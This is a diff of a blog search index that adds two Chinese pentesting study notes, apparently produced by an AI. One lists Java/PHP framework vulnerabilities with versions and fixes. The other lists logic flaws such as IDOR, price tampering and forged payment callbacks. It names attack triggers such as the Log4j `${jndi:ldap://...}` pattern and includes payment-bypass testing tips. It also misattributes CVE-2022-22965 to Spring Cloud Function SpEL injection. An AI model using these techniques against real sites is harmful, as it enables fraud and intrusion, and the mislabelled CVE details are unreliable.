<code>rememberMe</code> Cookie 实现反序列化</li><li><strong>修复</strong>：<ul><li>升级 Shiro 至 ≥ 1.4.2</li><li>自定义随机密钥</li></ul></li></ul><hr><h2 id="2-Fastjson"><a href="#2-Fastjson" class="headerlink" title="2. Fastjson"></a>2. Fastjson</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>Alibaba 开源的 Java 语言数据处理工具（JSON 解析库）。</p><h3 id="漏洞分支-1"><a href="#漏洞分支-1" class="headerlink" title="漏洞分支"></a>漏洞分支</h3><ul><li><strong>Fastjson 1.2.24 及以下</strong>：远程代码执行（RCE）</li><li><strong>核心原理</strong>：<code>@type</code> 字段导致反序列化（<code>AutoType</code> 功能被滥用）</li><li><strong>修复方式</strong>：<ul><li>升级至 1.2.83 或更高版本</li><li>关闭 <code>AutoType</code> 支持（<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(false)</code>）</li></ul></li></ul><hr><h2 id="3-Struts2"><a href="#3-Struts2" class="headerlink" title="3. Struts2"></a>3. Struts2</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>Struts2 是基于 MVC 模式的 Java Web 框架，主要针对 Web 应用。</p><h3 id="漏洞分支（S2-系列）"><a href="#漏洞分支（S2-系列）" class="headerlink" title="漏洞分支（S2-系列）"></a>漏洞分支（S2-系列）</h3><table><thead><tr><th>漏洞编号</th><th>原理简述</th><th>影响版本</th><th>修复版本</th></tr></thead><tbody><tr><td><strong>S2-016</strong></td><td>OGNL 表达式注入（<code>redirect</code> 参数）</td><td>Struts 2.0.0 ~ 2.3.15</td><td>2.3.15.1</td></tr><tr><td><strong>S2-045</strong></td><td>Content-Type 头导致 OGNL 注入</td><td>Struts 2.3.5 ~ 2.3.31</td><td>2.3.32</td></tr><tr><td><strong>S2-046</strong></td><td>Multipart 文件上传导致 OGNL 注入</td><td>Struts 2.3.5 ~ 2.3.31</td><td>2.3.32</td></tr><tr><td><strong>S2-053</strong></td><td>模板引擎（Freemarker）中的 OGNL 注入</td><td>Struts 2.0.0 ~ 2.3.33</td><td>2.3.34</td></tr><tr><td><strong>S2-057</strong></td><td>Namespace 污染导致 RCE</td><td>Struts 2.0.4 ~ 2.5.16</td><td>2.5.17</td></tr></tbody></table><p><strong>通用修复建议</strong>：</p><ul><li>升级至最新 Struts2 版本</li><li>禁用 OGNL 表达式动态执行</li></ul><hr><h2 id="4-Spring-框架"><a href="#4-Spring-框架" class="headerlink" title="4. Spring 框架"></a>4. Spring 框架</h2><h3 id="SpringMVC-SpringBoot"><a href="#SpringMVC-SpringBoot" class="headerlink" title="SpringMVC &#x2F; SpringBoot"></a>SpringMVC &#x2F; SpringBoot</h3><h4 id="常见漏洞点"><a href="#常见漏洞点" class="headerlink" title="常见漏洞点"></a>常见漏洞点</h4><ul><li><strong>SpringMVC</strong>：路径遍历、文件上传绕过</li><li><strong>SpringBoot</strong>：<ul><li>Actuator 未授权访问（<code>/actuator</code> 接口）</li><li>Jolokia 未授权 RCE</li><li>Spring Cloud Gateway RCE（CVE-2022-22947 等）</li></ul></li></ul><h4 id="具体漏洞示例"><a href="#具体漏洞示例" class="headerlink" title="具体漏洞示例"></a>具体漏洞示例</h4><ul><li><strong>Spring Framework RCE (CVE-2022-22965)</strong>：Spring Cloud Function + SpEL 表达式注入</li><li><strong>Spring Cloud Gateway RCE (CVE-2022-22947)</strong>：<code>id</code> 参数 SpEL 注入</li><li><strong>Spring Boot Actuator</strong>：未授权访问导致信息泄露</li></ul><p><strong>修复</strong>：</p><ul><li>升级 Spring Boot 至 2.6.6+ &#x2F; 2.7.0+</li><li>关闭不必要的 Actuator Endpoint</li><li>使用 <code>Spring Cloud</code> 最新安全版本</li></ul><hr><h2 id="5-ThinkPHP"><a href="#5-ThinkPHP" class="headerlink" title="5. ThinkPHP"></a>5. ThinkPHP</h2><h3 id="版本分支"><a href="#版本分支" class="headerlink" title="版本分支"></a>版本分支</h3><h4 id="ThinkPHP-5-x（5-0-5-1）"><a href="#ThinkPHP-5-x（5-0-5-1）" class="headerlink" title="ThinkPHP 5.x（5.0 ~ 5.1）"></a>ThinkPHP 5.x（5.0 ~ 5.1）</h4><ul><li><strong>漏洞</strong>：SQL 注入、文件包含、RCE（<code>thinkphp</code> 框架核心漏洞）</li><li><strong>典型 CVE</strong>：<ul><li>ThinkPHP 5.0.x 任意文件包含</li><li>ThinkPHP 5.1.x 命令执行</li></ul></li></ul><h4 id="ThinkPHP-3-x（3-0-3-2）"><a href="#ThinkPHP-3-x（3-0-3-2）" class="headerlink" title="ThinkPHP 3.x（3.0 ~ 3.2）"></a>ThinkPHP 3.x（3.0 ~ 3.2）</h4><ul><li><strong>漏洞</strong>：SQL 注入、XSS、文件上传</li><li><strong>典型</strong>：ThinkPHP 3.x 框架通用漏洞较多</li></ul><p><strong>修复建议</strong>：</p><ul><li>升级至 ThinkPHP 6.x（推荐）</li><li>严格过滤用户输入，开启 <code>request</code> 严格模式</li></ul><hr><h2 id="6-Apache-Log4j"><a href="#6-Apache-Log4j" class="headerlink" title="6. Apache Log4j"></a>6. Apache Log4j</h2><h3 id="漏洞分支（Log4j2）"><a href="#漏洞分支（Log4j2）" class="headerlink" title="漏洞分支（Log4j2）"></a>漏洞分支（Log4j2）</h3><ul><li><strong>Log4j2 JNDI 注入（CVE-2021-44228）</strong>：最著名“核弹级”漏洞<ul><li>影响版本：2.0-beta9 ~ 2.14.1</li><li>触发：<code>$&#123;jndi:ldap://...&#125;</code> 表达式</li></ul></li><li><strong>Log4j2 其他</strong>：<ul><li>CVE-2021-45046</li><li>CVE-2021-45105</li><li>CVE-2021-44832</li></ul></li></ul><p><strong>修复</strong>：</p><ul><li>升级至 <strong>2.17.1</strong>（或更高）</li><li>移除 JNDI 功能（<code>log4j2.formatMsgNoLookups=true</code>）</li></ul><hr><h2 id="附加内容（图片中其他节点）"><a href="#附加内容（图片中其他节点）" class="headerlink" title="附加内容（图片中其他节点）"></a>附加内容（图片中其他节点）</h2><ul><li><strong>Fastjson 漏洞利用方式</strong>：<code>@type</code> + 恶意类加载</li><li><strong>Spring Cloud Function &#x2F; SpEL</strong> 表达式注入</li><li><strong>白名单错误页面</strong>（WhiteList Error Page）示例</li><li><strong>Apache Log4j 升级建议</strong>：<code>log4j2.formatMsgNoLookups=true</code> + 最新版本</li><li><strong>Shiro 升级命令</strong>：<code>mvn dependency:tree</code> 检查版本</li></ul><hr><p><strong>使用说明</strong>：</p><ul><li>本 Markdown 已按思维导图分支结构化整理</li><li>每个框架下包含 <strong>原理</strong>、<strong>影响版本</strong>、<strong>修复方式</strong></li><li>可直接复制保存为 <code>源码框架漏洞.md</code> 文件</li><li>如需添加图片或进一步细分某个漏洞，可告诉我我继续完善！</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> web渗透 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 学习 </tag>
+            
+            <tag> web渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>逻辑漏洞</title>
+      <link href="/2025/07/21/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2025/07/21/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><p><strong>中心主题</strong>：逻辑漏洞</p><hr><h2 id="1-越权"><a href="#1-越权" class="headerlink" title="1. 越权"></a>1. 越权</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul><li><strong>水平越权</strong>：同一权限等级用户之间相互越权（修改其他用户数据）</li><li><strong>垂直越权</strong>：低权限用户越权访问高权限功能</li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul><li>后端未进行严格的权限校验，仅在前台做界面限制</li><li>依赖客户端传参判断身份，而非服务器端会话校验</li><li>不安全的直接对象引用（Insecure Direct Object Reference）</li></ul><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><ul><li>修改 URL&#x2F;参数中的 ID、订单号、用户ID 等</li><li>使用低权限账号尝试访问高权限接口</li><li>遍历其他用户的资源 ID</li></ul><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol><li>每次请求必须校验当前用户身份与目标资源归属关系</li><li>使用 Session&#x2F;Token 绑定用户身份</li><li>对所有敏感操作添加服务器端权限判断</li><li>避免直接暴露可预测的 ID（如自增 ID），改用 UUID 或加密 ID</li><li>对输入参数进行严格白名单过滤</li></ol><hr><h2 id="2-数据篡改（参数修改）"><a href="#2-数据篡改（参数修改）" class="headerlink" title="2. 数据篡改（参数修改）"></a>2. 数据篡改（参数修改）</h2><h3 id="常见篡改点"><a href="#常见篡改点" class="headerlink" title="常见篡改点"></a>常见篡改点</h3><ul><li>商品编号、ID、购买数量、价格、优惠券</li><li>支付方式、订单状态、退款金额</li><li>用户类型（儿童、老人、成人、VIP 等）</li><li>其他任意可控参数（如 amount、status、role）</li></ul><h3 id="用户类型修改"><a href="#用户类型修改" class="headerlink" title="用户类型修改"></a>用户类型修改</h3><ul><li>在请求数据包中把“儿童”改为“成人”或“VIP”</li><li>利用金额字段修改为 0 或负数</li><li>多次修改参数绕过前端校验</li></ul><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>服务器信任客户端提交的参数，未做二次校验或业务逻辑验证</p><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>所有金额、状态、类型字段后端重新计算&#x2F;校验</li><li>关键字段（如价格、权限）从服务器端数据库重新读取</li><li>使用业务逻辑层二次验证</li></ul><hr><h2 id="3-登录相关逻辑漏洞"><a href="#3-登录相关逻辑漏洞" class="headerlink" title="3. 登录相关逻辑漏洞"></a>3. 登录相关逻辑漏洞</h2><h3 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h3><ul><li><strong>客户信息泄露</strong>：返回包中包含其他用户手机号、邮箱</li><li><strong>Response 状态值绕过</strong>：修改返回的 success、code 值</li><li><strong>Session 覆盖</strong>：登录时覆盖他人 Session</li><li><strong>找回密码流程绕过</strong>：跳过验证步骤、Token 固定</li><li><strong>验证码绕过</strong>：多次请求同一验证码有效、图形验证码识别绕过</li></ul><h3 id="检测要点"><a href="#检测要点" class="headerlink" title="检测要点"></a>检测要点</h3><ul><li>查看返回包是否包含其他用户敏感信息</li><li>修改返回状态码观察业务是否仍执行</li><li>使用同一 Token 登录多个账号</li></ul><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ul><li>返回包严格过滤敏感字段</li><li>所有状态判断必须服务端重新校验</li><li>Session 与 IP&#x2F;User-Agent 绑定</li><li>找回密码流程每步都必须重新验证</li></ul><hr><h2 id="4-业务逻辑漏洞"><a href="#4-业务逻辑漏洞" class="headerlink" title="4. 业务逻辑漏洞"></a>4. 业务逻辑漏洞</h2><h3 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h3><ul><li><strong>订单 ID</strong>：任意订单号修改支付金额</li><li><strong>手机号 &#x2F; 用户 ID</strong>：修改收货人信息</li><li><strong>商品 ID</strong>：购买不存在或下架商品</li><li><strong>其他</strong>：购物车数量、优惠叠加、退款金额</li></ul><h3 id="漏洞根源"><a href="#漏洞根源" class="headerlink" title="漏洞根源"></a>漏洞根源</h3><ul><li>业务流程未严格按步骤校验</li><li>前端流程可跳过，后端未做完整性检查</li><li>Token&#x2F;签名在关键步骤未重新验证</li></ul><h3 id="典型案例"><a href="#典型案例" class="headerlink" title="典型案例"></a>典型案例</h3><ol><li>商品购买流程：修改数量 → 绕过库存校验 → 低价购买</li><li>密码修改：先验证旧密码 → 修改为任意新密码（未二次验证）</li><li>支付漏洞：回调地址可控 → 伪造支付成功</li></ol><hr><h2 id="5-未授权访问"><a href="#5-未授权访问" class="headerlink" title="5. 未授权访问"></a>5. 未授权访问</h2><h3 id="常见目标服务（直接访问即可利用）"><a href="#常见目标服务（直接访问即可利用）" class="headerlink" title="常见目标服务（直接访问即可利用）"></a>常见目标服务（直接访问即可利用）</h3><ul><li>JBoss 未授权访问</li><li>Jenkins 未授权访问</li><li>Redis 未授权访问</li><li>Elasticsearch 未授权访问</li><li>MemCache 未授权访问</li><li>MongoDB 未授权访问</li><li>Zookeeper 未授权访问</li><li>Docker 未授权访问</li><li>WebService 测试接口</li></ul><p><strong>检测方法</strong>：直接访问对应端口或路径（无登录即可操作）</p><hr><h2 id="6-验证安全（Token-验证码）"><a href="#6-验证安全（Token-验证码）" class="headerlink" title="6. 验证安全（Token &#x2F; 验证码）"></a>6. 验证安全（Token &#x2F; 验证码）</h2><h3 id="Token-类漏洞"><a href="#Token-类漏洞" class="headerlink" title="Token 类漏洞"></a>Token 类漏洞</h3><ul><li><strong>爆破</strong>：Token 可暴力破解</li><li><strong>回显</strong>：Token 值直接返回前端</li><li><strong>固定</strong>：Token 不随用户&#x2F;时间变化</li><li><strong>识别</strong>：可通过特征识别他人 Token</li><li><strong>绕过</strong>：无 Token 仍可访问</li><li><strong>重放</strong>：同一 Token 多次使用有效</li></ul><h3 id="验证码类漏洞"><a href="#验证码类漏洞" class="headerlink" title="验证码类漏洞"></a>验证码类漏洞</h3><ul><li>图形验证码可 OCR 识别</li><li>短信&#x2F;邮箱验证码可无限发送</li><li>验证码不与用户绑定</li><li>验证码有效期过长</li></ul><h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><ul><li>Token 使用 JWT + 签名 + 短有效期</li><li>绑定 IP&#x2F;User-Agent&#x2F;Session</li><li>验证码必须后端重新验证且一次性使用</li></ul><hr><h2 id="7-回调漏洞"><a href="#7-回调漏洞" class="headerlink" title="7. 回调漏洞"></a>7. 回调漏洞</h2><h3 id="常见形式"><a href="#常见形式" class="headerlink" title="常见形式"></a>常见形式</h3><ul><li><strong>回调地址可控</strong>（callback 参数）</li><li>数据不存在时仍返回敏感信息</li><li>支付&#x2F;登录回调未验证签名</li><li>回调后直接执行敏感操作</li></ul><h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><ul><li>回调地址必须白名单限制</li><li>所有回调必须校验签名和 Token</li><li>回调数据与业务状态二次校验</li></ul><hr><h2 id="8-漏洞根源分析"><a href="#8-漏洞根源分析" class="headerlink" title="8. 漏洞根源分析"></a>8. 漏洞根源分析</h2><h3 id="确定业务流程"><a href="#确定业务流程" class="headerlink" title="确定业务流程"></a>确定业务流程</h3><ul><li>梳理完整业务链路（从前端到后端每一步）</li><li>找出所有可能被跳过的步骤</li></ul><h3 id="商品购买-支付-密码修改流程分析"><a href="#商品购买-支付-密码修改流程分析" class="headerlink" title="商品购买 &#x2F; 支付 &#x2F; 密码修改流程分析"></a>商品购买 &#x2F; 支付 &#x2F; 密码修改流程分析</h3><ol><li>前端流程可跳过 → 后端未做完整性校验</li><li>参数可随意修改 → 未从数据库重新取值</li><li>Token&#x2F;签名在关键步骤未重新验证</li><li>回调接口未做身份校验</li></ol><h3 id="支付漏洞控制技巧"><a href="#支付漏洞控制技巧" class="headerlink" title="支付漏洞控制技巧"></a>支付漏洞控制技巧</h3><ul><li>分析所有支付相关参数</li><li>尝试修改金额、状态、回调地址</li><li>伪造支付成功回调</li><li>多次支付后观察后端处理逻辑</li></ul><hr><p><strong>参考链接</strong></p><ul><li>支付漏洞控制技巧详解：<a href="https://www.secpulse.com/archives/6780.html">https://www.secpulse.com/archives/6780.html</a></li><li>密码修改漏洞详解：<a href="https://www.secpulse.com/archives/6780.html">https://www.secpulse.com/archives/6780.html</a></li></ul><hr><p><strong>使用说明</strong>：</p><ul><li>本 Markdown 已完全按照思维导图结构整理</li><li>每个大类包含 <strong>原理、检测、修复、案例</strong></li><li>可直接保存为 <code>逻辑漏洞.md</code></li><li>如需合并上一个「源码框架漏洞」文件，或继续补充其他思维导图，请告诉我！</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> web渗透 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 学习 </tag>
+            
+            <tag> web渗透 </tag>
             
         </tags>
       
